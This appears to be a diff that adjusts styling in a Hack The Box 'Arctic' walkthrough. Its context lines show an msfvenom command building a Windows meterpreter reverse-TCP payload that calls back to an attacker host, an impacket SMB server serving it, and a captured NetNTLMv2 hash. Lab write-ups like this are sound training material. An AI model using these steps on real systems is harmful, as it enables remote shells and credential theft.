@@ -19,7 +19,7 @@ categories:
 <br>First generate the Payload
 
 <font size="1">
-<div style="height:100px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
+<div style="height:150px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
   
 <p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.*.*.10 LPORT=4455 -f exe > arctic.exe
 <br>No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -35,7 +35,7 @@ categories:
 <br>And then run it 
 
 <font size="1">
-<div style="height:100px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
+<div style="height:150px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
 
 <p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># impacket-smbserver teck /root/Desktop/
 <br>Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>
@@ -69,7 +69,7 @@ categories:
 <br>[*] Incoming connection (10.10.10.11,51377)
 <br>[*] AUTHENTICATE_MESSAGE (ARCTIC\tolis,ARCTIC)
 <br>[*] User tolis\ARCTIC authenticated successfully
-<br>[*] <br>tolis::ARCTIC:4141414141414141:2c61717958f1127eca09aa171e1c1d09:01010000000000000065347207f9d30170ad6d3e142ee07700000000010010007500<br>5300590056004f006700630067000200100061004c0076004b0078004c0050007a000300100075005300590056004f006700630067000400100061004c0076004b00<br>78004c0050007a00070008000065347207f9d301060004000200000008003000300000000000000000000000003000005f5d2c0dd8d042f2bceefe6e8fb2072d4dd0<br>38e23ce10f454d55eee31d91688c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00<br>31003000000000000000000000000000<p>
+<br>[*] <br>tolis::ARCTIC:4141414141414141:2c61717958f1127eca09aa171e1c1d09:01010000000000000065347207f9d30170ad6d3e142ee07700000000010010007500<br>5300590056004f006700630067000200100061004c0076004b0078004c0050007a000300100075005300590056004f006700630067000400100061004c0076004b00<br>78004c0050007a00070008000065347207f9d301060004000200000008003000300000000000000000000000003000005f5d2c0dd8d042f2bceefe6e8fb2072d4dd0<br>38e23ce10f454d55eee31d91688c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00<br>31003000000000000000000000000000</p>
 
 </div>
 </font>
